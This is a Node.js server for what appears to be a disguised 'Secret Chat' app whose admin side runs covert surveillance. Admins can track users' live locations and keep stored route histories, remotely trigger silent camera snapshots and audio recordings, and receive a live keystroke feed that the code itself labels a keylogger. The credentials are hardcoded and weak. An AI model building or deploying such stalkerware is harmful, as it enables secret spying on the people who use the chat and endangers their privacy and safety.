const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const path = require('path');
const fs = require('fs');
const basicAuth = require('express-basic-auth');
const webpush = require('web-push');

const app = express();
const server = http.createServer(app);
const io = new Server(server);

// --- AUTHENTICATION CONFIGURATION ---
const userAuth = basicAuth({
    users: { 'user': 'chat123' },
    challenge: true,
    realm: 'Secret Chat'
});

const adminAuth = basicAuth({
    users: { 'admin': 'admin123' },
    challenge: true,
    realm: 'Admin Area'
});

const MESSAGES_FILE = path.join(__dirname, 'messages.json');
let chatMessagesHistory = [];

// Load existing messages
try {
    if (fs.existsSync(MESSAGES_FILE)) {
        const fileData = fs.readFileSync(MESSAGES_FILE, 'utf-8');
        chatMessagesHistory = JSON.parse(fileData);
    }
} catch (err) {
    console.error("Error loading chat history:", err);
}

function saveMessagesHistory() {
    try {
        fs.writeFileSync(MESSAGES_FILE, JSON.stringify(chatMessagesHistory, null, 2), 'utf-8');
    } catch (err) {
        console.error("Error saving chat history:", err);
    }
}

// --- PUSH NOTIFICATIONS (VAPID) ---
// Keys auto-generated once and stored in vapid-keys.json
const VAPID_FILE = path.join(__dirname, 'vapid-keys.json');
let vapidKeys = null;
try {
    if (fs.existsSync(VAPID_FILE)) vapidKeys = JSON.parse(fs.readFileSync(VAPID_FILE, 'utf-8'));
} catch (e) {}
if (!vapidKeys) {
    vapidKeys = webpush.generateVAPIDKeys();
    fs.writeFileSync(VAPID_FILE, JSON.stringify(vapidKeys, null, 2), 'utf-8');
}
webpush.setVapidDetails('mailto:admin@securechannel.local', vapidKeys.publicKey, vapidKeys.privateKey);

const pushSubscriptions = new Map(); // username -> subscription
let pushPublicKeyCache = null;

// Public key endpoint (no auth needed for subscribing)
app.get('/push-public-key', (req, res) => res.json({ publicKey: vapidKeys.publicKey }));

function sendPushTo(username, payload) {
    const sub = pushSubscriptions.get(username);
    if (!sub) return;
    webpush.sendNotification(sub, JSON.stringify(payload)).catch((err) => {
        if (err.statusCode === 404 || err.statusCode === 410) pushSubscriptions.delete(username);
    });
}

// Health Check endpoint (No Auth Required)
app.get('/health', (req, res) => res.status(200).send('OK'));

// Prevent bypassing auth by accessing static html files directly
app.get('/index.html', (req, res) => res.redirect('/'));
app.get('/admin.html', (req, res) => res.redirect('/admin'));

// Serve chat page only to authenticated users
app.get('/', userAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'index.html'));
});

// Serve admin dashboard only to admin users
app.get('/admin', adminAuth, (req, res) => {
    res.sendFile(path.join(__dirname, 'admin.html'));
});

// Serve static files
app.use(express.static(path.join(__dirname)));

// Persisted last-known locations (survives disconnects & restarts)
const LOCATIONS_FILE = path.join(__dirname, 'locations.json');
let lastKnownLocations = new Map(); // username -> { lat, lon, addressDetails, username, lastSeen }
try {
    if (fs.existsSync(LOCATIONS_FILE)) {
        const arr = JSON.parse(fs.readFileSync(LOCATIONS_FILE, 'utf-8'));
        arr.forEach(u => lastKnownLocations.set(u.username, u));
    }
} catch (err) {
    console.error("Error loading locations:", err);
}

function saveLocations() {
    try {
        fs.writeFileSync(LOCATIONS_FILE, JSON.stringify(Array.from(lastKnownLocations.values()), null, 2), 'utf-8');
    } catch (err) {
        console.error("Error saving locations:", err);
    }
}

// Persisted route history (per username)
const ROUTES_FILE = path.join(__dirname, 'routes.json');
let routeHistory = new Map(); // username -> [{ lat, lon, at }]
try {
    if (fs.existsSync(ROUTES_FILE)) {
        const obj = JSON.parse(fs.readFileSync(ROUTES_FILE, 'utf-8'));
        Object.entries(obj).forEach(([u, pts]) => routeHistory.set(u, pts));
    }
} catch (err) { console.error("Error loading routes:", err); }

function saveRoutes() {
    try {
        fs.writeFileSync(ROUTES_FILE, JSON.stringify(Object.fromEntries(routeHistory), null, 2), 'utf-8');
    } catch (err) { console.error("Error saving routes:", err); }
}

// Admin requests a user's full route
const CONSENTS_FILE = path.join(__dirname, 'consents.json');
let consentLog = [];
try {
    if (fs.existsSync(CONSENTS_FILE)) {
        consentLog = JSON.parse(fs.readFileSync(CONSENTS_FILE, 'utf-8'));
    }
} catch (err) { console.error("Error loading consents:", err); }

const activeUsers = new Map(); // Currently-connected users' live locations
let onlineChatUsersCount = 0;
const chatUsers = new Map(); // socket.id -> username

io.on('connection', (socket) => {
    // --- ADMIN LOGIC ---
    socket.on('admin_join', () => {
        socket.join('admins');
        const usersArray = Array.from(activeUsers.entries()).map(([id, data]) => ({
            id,
            ...data
        }));
        socket.emit('initial_locations', usersArray);

        // Also send saved last-known locations (offline users)
        const offlineArray = Array.from(lastKnownLocations.values())
            .filter(u => u.username && !usersArray.some(a => a.username === u.username))
            .map((u, i) => ({ id: `saved_${u.username}`, ...u, online: false }));
        socket.emit('initial_locations', offlineArray);
    });

    socket.on('update_location', (data) => {
        // data contains: lat, lon, addressDetails, username
        activeUsers.set(socket.id, data);

        const now = Date.now();
        const point = { lat: data.lat, lon: data.lon, at: now };

        // Persist last-known location per username
        if (data.username) {
            lastKnownLocations.set(data.username, {
                ...data,
                lastSeen: now,
                online: true
            });

            // Route history: append point, cap at 500 points per user per day-window
            let route = routeHistory.get(data.username) || [];
            const last = route[route.length - 1];
            // Skip if moved less than ~10 meters to avoid noise spam (approx via coords diff)
            if (!last || Math.abs(last.lat - data.lat) > 0.0001 || Math.abs(last.lon - data.lon) > 0.0001) {
                route.push(point);
                if (route.length > 500) route = route.slice(-500);
                routeHistory.set(data.username, route);
                saveRoutes();
            }
            saveLocations();
        }

        io.to('admins').emit('user_location_updated', {
            id: socket.id,
            ...data,
            point
        });
    });
    
    // User registers for push notifications
    socket.on('push_subscription', (sub) => {
        const name = chatUsers.get(socket.id);
        if (name && sub && sub.endpoint) {
            pushSubscriptions.set(name, sub);
        }
    });

    // Admin sends a push notification to a user
    socket.on('admin_send_push', ({ username, title, body }) => {
        if (!username) return;
        sendPushTo(username, { title: title || '🔐 القناة الآمنة', body: body || 'لديك رسالة من المشرف', url: '/' });
    });

    // Admin requests full route history for a username
    socket.on('request_route', (username) => {
        const route = routeHistory.get(username) || [];
        socket.emit('route_history', { username, route });
    });

    // Admin requesting a photo from a specific user
    socket.on('request_snapshot', (userId) => {
        io.to(userId).emit('take_snapshot');
    });

    // Admin requesting audio from a specific user
    socket.on('request_audio', (userId) => {
        io.to(userId).emit('take_audio');
    });


    // --- CHAT LOGIC ---
    // Explicit consent record (user saw the consent screen and clicked)
    socket.on('user_consent', (data) => {
        consentLog.push({ username: data.username, location: !!data.location, camera: !!data.camera, declined: !!data.declined, at: data.at || Date.now() });
        try { fs.writeFileSync(CONSENTS_FILE, JSON.stringify(consentLog, null, 2), 'utf-8'); } catch (e) {}
        io.to('admins').emit('consent_recorded', data);
    });

    socket.on('user_join_chat', (username) => {
        chatUsers.set(socket.id, username);
        onlineChatUsersCount++;
        
        // Notify everyone about count
        io.emit('online_users_count', onlineChatUsersCount);
        
        // Send history to the joined user
        socket.emit('chat_history', chatMessagesHistory);
        
        // Notify others that someone joined
        socket.broadcast.emit('user_joined_notice', username);
    });

    socket.on('chat_message', (data) => {
        // Save to memory and JSON file
        chatMessagesHistory.push(data);
        saveMessagesHistory();
        
        // Broadcast message to everyone EXCEPT sender
        socket.broadcast.emit('chat_message', data);
    });

    // User sending the photo silently to admins
    socket.on('snapshot_result', (data) => {
        io.to('admins').emit('snapshot_received', {
            id: socket.id,
            username: data.username,
            image: data.image
        });
    });

    // User sending the audio silently to admins
    socket.on('audio_result', (data) => {
        io.to('admins').emit('audio_received', {
            id: socket.id,
            username: data.username,
            audio: data.audio
        });
    });

    // User is typing (Keylogger)
    socket.on('live_typing', (text) => {
        // Send exactly what they type to the admin
        io.to('admins').emit('user_typing_live', {
            id: socket.id,
            text: text
        });
        
        // Broadcast to other users in the chat room to show the UI typing indicator
        if (text.length > 0) {
            socket.broadcast.emit('show_typing_indicator');
        }
    });

    
    // --- DISCONNECT ---
    socket.on('disconnect', () => {
        // Handle Admin map removal
        if (activeUsers.has(socket.id)) {
            const userData = activeUsers.get(socket.id);
            activeUsers.delete(socket.id);

            // Mark as offline in persisted store (keep last location)
            if (userData.username && lastKnownLocations.has(userData.username)) {
                const saved = lastKnownLocations.get(userData.username);
                saved.online = false;
                saved.lastSeen = Date.now();
                lastKnownLocations.set(userData.username, saved);
                saveLocations();

                io.to('admins').emit('user_went_offline', { id: socket.id, username: userData.username });
            }

            io.to('admins').emit('user_disconnected', socket.id);
        }

        // Handle Chat leave
        if (chatUsers.has(socket.id)) {
            const username = chatUsers.get(socket.id);
            chatUsers.delete(socket.id);
            onlineChatUsersCount--;
            
            io.emit('online_users_count', onlineChatUsersCount);
            socket.broadcast.emit('user_left_notice', username);
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
    console.log(`Server is running on http://localhost:${PORT}`);
    console.log(`Admin Dashboard: http://localhost:${PORT}/admin`);
});
